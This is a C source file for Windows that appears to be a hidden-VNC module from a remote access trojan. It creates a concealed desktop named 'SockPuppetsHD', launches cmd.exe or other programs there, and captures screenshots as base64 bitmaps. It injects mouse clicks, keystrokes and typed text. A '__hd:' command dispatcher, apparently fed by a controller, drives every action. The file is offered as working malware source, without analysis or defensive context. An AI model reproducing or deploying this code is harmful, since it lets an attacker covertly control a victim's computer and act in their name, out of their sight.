#include <windows.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

static HDESK g_hd;

static char *dupstr(const char *s) {
    size_t n = strlen(s);
    char *o = (char *)malloc(n + 1);
    if (o) memcpy(o, s, n + 1);
    return o;
}

static char *b64(const unsigned char *data, size_t len) {
    static const char t[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    size_t out_len = 4 * ((len + 2) / 3);
    char *out = (char *)malloc(out_len + 1);
    size_t i, j = 0;
    if (!out) return NULL;
    for (i = 0; i < len; i += 3) {
        unsigned n = data[i] << 16;
        if (i + 1 < len) n |= data[i + 1] << 8;
        if (i + 2 < len) n |= data[i + 2];
        out[j++] = t[(n >> 18) & 63];
        out[j++] = t[(n >> 12) & 63];
        out[j++] = (i + 1 < len) ? t[(n >> 6) & 63] : '=';
        out[j++] = (i + 2 < len) ? t[n & 63] : '=';
    }
    out[j] = 0;
    return out;
}

static int ensure(void) {
    if (g_hd) return 1;
    g_hd = CreateDesktopW(L"SockPuppetsHD", NULL, NULL, 0, 0x10000000, NULL);
    if (!g_hd) g_hd = OpenDesktopW(L"SockPuppetsHD", 0, FALSE, 0x02000000);
    if (!g_hd) g_hd = OpenDesktopW(L"SockPuppetsHD", 0, FALSE, 0x10000000);
    return g_hd != NULL;
}

static char *on_desktop(char *(*fn)(void *), void *arg) {
    if (!ensure()) {
        char buf[64];
        snprintf(buf, sizeof(buf), "desktop open failed %lu", GetLastError());
        return dupstr(buf);
    }
    if (!SetThreadDesktop(g_hd)) return dupstr("set desktop failed");
    return fn(arg);
}

static char *do_start(void *arg) {
    const char *exe = arg && ((const char *)arg)[0] ? (const char *)arg : "C:\\Windows\\System32\\cmd.exe";
    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    wchar_t desktop[] = L"WinSta0\\SockPuppetsHD";
    wchar_t cmd[1024];
    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    si.cb = sizeof(si);
    si.lpDesktop = desktop;
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_SHOW;
    MultiByteToWideChar(CP_UTF8, 0, exe, -1, cmd, 1024);
    if (!CreateProcessW(NULL, cmd, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi))
        return dupstr("spawn failed");
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    char buf[64];
    snprintf(buf, sizeof(buf), "desktop started pid=%lu", pi.dwProcessId);
    return dupstr(buf);
}

static char *do_frame(void *arg) {
    (void)arg;
    HDC hdc = GetDC(NULL);
    int sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN);
    int dw, dh, stride, y;
    HDC mem;
    HBITMAP bmp, old;
    BITMAPINFO bi;
    unsigned char *pixels, *file;
    char *encoded, *out;
    size_t flen;
    if (sw <= 0 || sh <= 0) { sw = 1024; sh = 768; }
    dw = sw > 320 ? 320 : sw;
    dh = sh * dw / sw;
    if (dh < 1) dh = 1;
    mem = CreateCompatibleDC(hdc);
    bmp = CreateCompatibleBitmap(hdc, dw, dh);
    old = SelectObject(mem, bmp);
    StretchBlt(mem, 0, 0, dw, dh, hdc, 0, 0, sw, sh, SRCCOPY);
    SelectObject(mem, old);
    ZeroMemory(&bi, sizeof(bi));
    bi.bmiHeader.biSize = 40;
    bi.bmiHeader.biWidth = dw;
    bi.bmiHeader.biHeight = dh;
    bi.bmiHeader.biPlanes = 1;
    bi.bmiHeader.biBitCount = 24;
    stride = ((dw * 3 + 3) / 4) * 4;
    pixels = (unsigned char *)calloc(1, stride * dh);
    GetDIBits(mem, bmp, 0, dh, pixels, &bi, DIB_RGB_COLORS);
    DeleteObject(bmp);
    DeleteDC(mem);
    ReleaseDC(NULL, hdc);
    flen = 54 + stride * (size_t)dh;
    file = (unsigned char *)calloc(1, flen);
    memcpy(file, "BM", 2);
    *(uint32_t *)(file + 2) = (uint32_t)flen;
    *(uint32_t *)(file + 10) = 54;
    *(uint32_t *)(file + 14) = 40;
    *(int32_t *)(file + 18) = dw;
    *(int32_t *)(file + 22) = dh;
    *(uint16_t *)(file + 26) = 1;
    *(uint16_t *)(file + 28) = 24;
    memcpy(file + 54, pixels, stride * (size_t)dh);
    free(pixels);
    encoded = b64(file, flen);
    free(file);
    out = (char *)malloc(32 + strlen(encoded));
    sprintf(out, "HDIMG:%d,%d:%s", sw, sh, encoded);
    free(encoded);
    (void)y;
    return out;
}

static char *do_click(void *arg) {
    int x = 0, y = 0, right = 0;
    int sw, sh;
    char *s = (char *)arg;
    if (!s || sscanf(s, "%d %d %d", &x, &y, &right) < 2) return dupstr("click needs x y");
    sw = GetSystemMetrics(SM_CXSCREEN); sh = GetSystemMetrics(SM_CYSCREEN);
    if (sw <= 0) sw = 1024;
    if (sh <= 0) sh = 768;
    mouse_event(MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_MOVE, (DWORD)(x * 65535 / sw), (DWORD)(y * 65535 / sh), 0, 0);
    if (right) {
        mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0);
        mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
        return dupstr("rclick");
    }
    mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
    mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
    {
        char buf[64];
        snprintf(buf, sizeof(buf), "click %d %d", x, y);
        return dupstr(buf);
    }
}

static char *do_type(void *arg) {
    const char *text = arg ? (const char *)arg : "";
    int n = 0;
    for (; *text; text++, n++) {
        wchar_t w;
        SHORT pair;
        BYTE vk;
        MultiByteToWideChar(CP_UTF8, 0, text, 1, &w, 1);
        if (*text == '\n' || *text == '\r') {
            keybd_event(VK_RETURN, 0, 0, 0);
            keybd_event(VK_RETURN, 0, KEYEVENTF_KEYUP, 0);
            continue;
        }
        pair = VkKeyScanW(w);
        vk = (BYTE)(pair & 0xFF);
        if (vk == 0xFF) continue;
        if (pair & 0x100) keybd_event(VK_SHIFT, 0, 0, 0);
        keybd_event(vk, 0, 0, 0);
        keybd_event(vk, 0, KEYEVENTF_KEYUP, 0);
        if (pair & 0x100) keybd_event(VK_SHIFT, 0, KEYEVENTF_KEYUP, 0);
    }
    {
        char buf[32];
        snprintf(buf, sizeof(buf), "typed %d", n);
        return dupstr(buf);
    }
}

static char *do_key(void *arg) {
    int vk = arg ? atoi((const char *)arg) : 13;
    if (vk <= 0) vk = 13;
    keybd_event((BYTE)vk, 0, 0, 0);
    keybd_event((BYTE)vk, 0, KEYEVENTF_KEYUP, 0);
    {
        char buf[32];
        snprintf(buf, sizeof(buf), "key %d", vk);
        return dupstr(buf);
    }
}

char *hidden_desktop(const char *cmd) {
    const char *rest, *sp, *action, *arg;
    char act[32];
    if (!cmd || strncmp(cmd, "__hd:", 5) != 0) return dupstr("unknown desktop action");
    rest = cmd + 5;
    while (*rest == ' ') rest++;
    sp = strchr(rest, ' ');
    if (!sp) { action = rest; arg = ""; }
    else {
        size_t n = (size_t)(sp - rest);
        if (n > 31) n = 31;
        memcpy(act, rest, n);
        act[n] = 0;
        action = act;
        arg = sp + 1;
    }
    if (action[0] == 0 || strcmp(action, "start") == 0) return on_desktop(do_start, (void *)arg);
    if (strcmp(action, "frame") == 0) return on_desktop(do_frame, NULL);
    if (strcmp(action, "click") == 0) return on_desktop(do_click, (void *)arg);
    if (strcmp(action, "rclick") == 0) {
        char buf[128];
        snprintf(buf, sizeof(buf), "%s 1", arg);
        return on_desktop(do_click, buf);
    }
    if (strcmp(action, "type") == 0) return on_desktop(do_type, (void *)arg);
    if (strcmp(action, "key") == 0) return on_desktop(do_key, (void *)arg);
    if (strcmp(action, "stop") == 0) {
        if (g_hd) { CloseDesktop(g_hd); g_hd = NULL; }
        return dupstr("desktop stopped");
    }
    return dupstr("unknown desktop action");
}
